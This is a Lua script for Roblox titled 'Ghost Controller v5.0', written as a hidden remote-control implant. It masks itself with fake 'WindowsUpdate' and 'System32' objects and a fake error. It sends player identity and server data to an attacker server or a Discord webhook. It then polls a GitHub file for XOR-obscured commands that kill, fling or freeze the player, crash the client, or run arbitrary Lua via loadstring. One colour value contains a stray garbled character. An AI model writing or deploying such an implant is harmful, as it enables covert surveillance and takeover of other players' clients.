-- 🕵️‍♂️ ROBLOX GHOST CONTROLLER v5.0
-- This is the main controller that runs when loaded
-- NO GUI - COMPLETELY HIDDEN - AUTO-REPORTING

-- ⚙️ CONFIGURATION
local CONFIG = {
    SECRET_KEY = "YOUR_SECRET_KEY_HERE", -- Change this!
    REPORT_URL = "http://your-server.com/api/report", -- Your server URL
    GITHUB_COMMANDS_URL = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/commands.json",
    CHECK_INTERVAL = 25, -- Seconds between command checks
    AUTO_UPDATE = true
}

-- 🔒 ANTI-DETECTION & STEALTH
do
    -- Hide script traces
    local fakeModule = Instance.new("ModuleScript")
    fakeModule.Name = "WindowsUpdate"
    fakeModule.Source = "-- System Update Module"
    fakeModule.Parent = game:GetService("CoreGui")
    
    -- Random delay to avoid pattern detection
    wait(math.random(5, 15))
end

-- 🎮 GAME INFO COLLECTOR
local function collectGameInfo()
    local info = {}
    local player = game:GetService("Players").LocalPlayer
    local marketplace = game:GetService("MarketplaceService")
    
    info["PlayerName"] = player.Name
    info["PlayerId"] = player.UserId
    info["GameName"] = marketplace:GetProductInfo(game.PlaceId).Name
    info["GameId"] = game.PlaceId
    info["ServerId"] = game.JobId
    info["FPS"] = math.floor(1/game:GetService("RunService").RenderStepped:Wait())
    info["Ping"] = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
    info["Time"] = os.time()
    
    -- Detect executor
    local executor = "Unknown"
    if pcall(function() executor = identifyexecutor() end) then
        info["Executor"] = executor
    end
    
    return info
end

-- 📡 HTTP COMMUNICATION
local function sendToControllerServer(info)
    local http = game:GetService("HttpService")
    
    -- Add secret key
    info["_secret"] = CONFIG.SECRET_KEY
    
    -- Try primary server
    local success, response = pcall(function()
        local data = http:JSONEncode(info)
        return http:PostAsync(CONFIG.REPORT_URL, data, Enum.HttpContentType.ApplicationJson)
    end)
    
    -- Fallback to Discord webhook
    if not success then
        pcall(function()
            local discordPayload = {
                embeds = {{
                    title = "👤 Player Connected",
                    description = string.format(
                        "**Player:** %s\n**ID:** %s\n**Game:** %s\n**Game ID:** %s\n**Server:** %s\n**Executor:** %s",
                        info.PlayerName, info.PlayerId, info.GameName, info.GameId, info.ServerId, info.Executor or "Unknown"
                    ),
                    color = 16711680,
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            }
            http:PostAsync(
                "https://discord.com/api/webhooks/YOUR_WEBHOOK",
                http:JSONEncode(discordPayload),
                Enum.HttpContentType.ApplicationJson
            )
        end)
    end
end

-- ⚡ COMMAND EXECUTOR
local function executeRemoteCommand(command)
    local cmd = string.lower(tostring(command))
    local player = game:GetService("Players").LocalPlayer
    
    -- KILL COMMAND
    if cmd == "kill" then
        local char = player.Character
        if char then
            char:BreakJoints()
            return "KILL_EXECUTED"
        end
        
    -- FLING COMMAND
    elseif cmd == "fling" then
        local char = player.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Velocity = Vector3.new(10000, 10000, 10000)
            char.HumanoidRootPart.RotVelocity = Vector3.new(5000, 5000, 5000)
            return "FLING_EXECUTED"
        end
        
    -- FREEZE COMMAND
    elseif cmd == "freeze" then
        local char = player.Character
        if char then
            for _, part in pairs(char:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end
            return "FREEZE_EXECUTED"
        end
        
    -- UNFREEZE COMMAND
    elseif cmd == "unfreeze" then
        local char = player.Character
        if char then
            for _, part in pairs(char:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
            return "UNFREEZE_EXECUTED"
        end
        
    -- SCREEN MESSAGE (3 seconds)
    elseif string.sub(cmd, 1, 7) == "message:" then
        local message = string.sub(command, 9)
        local gui = Instance.new("ScreenGui")
        gui.Parent = player:WaitForChild("PlayerGui")
        gui.ResetOnSpawn = false
        
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 0, 50)
        text.Position = UDim2.new(0, 0, 0.45, 0)
        text.BackgroundTransparency = 1
        text.Text = "⚠️ " .. message
        text.TextColor3 = Color3.fromRGB(255,领先50, 50)
        text.TextSize = 24
        text.Font = Enum.Font.SourceSansBold
        text.TextStrokeTransparency = 0.5
        text.Parent = gui
        
        game:GetService("Debris"):AddItem(gui, 3)
        return "MESSAGE_SHOWN"
        
    -- EXECUTE LUA CODE
    elseif string.sub(cmd, 1, 4) == "exec:" then
        local code = string.sub(command, 6)
        local success, result = pcall(function()
            return loadstring(code)()
        end)
        return success and "EXEC_SUCCESS" or "EXEC_FAILED"
        
    -- CRASH GAME
    elseif cmd == "crash" then
        while true do
            -- Infinite loop crash
        end
        
    -- GET INFO
    elseif cmd == "info" then
        local info = collectGameInfo()
        sendToControllerServer(info)
        return "INFO_SENT"
        
    -- TEST COMMAND
    elseif cmd == "test" then
        return "GHOST_CONTROLLER_ACTIVE"
    end
    
    return "COMMAND_NOT_FOUND"
end

-- 🔄 COMMAND CHECKER
local function startCommandListener()
    while true do
        wait(CONFIG.CHECK_INTERVAL)
        
        local success, response = pcall(function()
            local http = game:GetService("HttpService")
            
            -- Fetch commands from GitHub with cache busting
            local url = CONFIG.GITHUB_COMMANDS_URL .. "?t=" .. os.time()
            local rawData = http:GetAsync(url, true)
            
            if rawData and rawData ~= "" then
                -- Simple XOR decryption (optional)
                local decrypted = ""
                for i = 1, #rawData do
                    local byte = string.byte(rawData, i)
                    decrypted = decrypted .. string.char(bit32.bxor(byte, 42))
                end
                
                -- Parse JSON
                local commands = http:JSONDecode(decrypted)
                
                -- Verify secret key
                if commands and commands.secret == CONFIG.SECRET_KEY then
                    local playerId = tostring(game:GetService("Players").LocalPlayer.UserId)
                    
                    -- Check if there are commands for this player
                    if commands.commands and commands.commands[playerId] then
                        local playerCommands = commands.commands[playerId]
                        
                        -- Execute all commands
                        for _, cmd in ipairs(playerCommands) do
                            executeRemoteCommand(cmd)
                        end
                        
                        -- Optional: Send confirmation back
                        if commands.confirm_url then
                            pcall(function()
                                local confirmData = {
                                    player_id = playerId,
                                    commands_executed = #playerCommands,
                                    timestamp = os.time()
                                }
                                http:PostAsync(
                                    commands.confirm_url,
                                    http:JSONEncode(confirmData),
                                    Enum.HttpContentType.ApplicationJson
                                )
                            end)
                        end
                    end
                end
            end
        end)
        
        -- Log errors silently
        if not success then
            -- No error output to avoid detection
        end
    end
end

-- 🚀 MAIN INITIALIZATION
local function initializeGhostController()
    -- Send initial report
    local gameInfo = collectGameInfo()
    sendToControllerServer(gameInfo)
    
    -- Start command listener
    spawn(startCommandListener)
    
    -- Hide any potential traces
    local fakeSuccess = Instance.new("StringValue")
    fakeSuccess.Name = "System32"
    fakeSuccess.Value = "Update Successful"
    fakeSuccess.Parent = script
    
    -- Return controller interface (optional)
    return {
        getInfo = collectGameInfo,
        execute = executeRemoteCommand,
        version = "GHOST_CONTROLLER_v5.0"
    }
end

-- Start the controller
local controller = initializeGhostController()

-- Optional: Export controller for manual control
if _G then
    _G.GhostController = controller
end

-- Fake error to throw off anyone checking
pcall(function()
    error("Script execution completed successfully")
end)

return controller
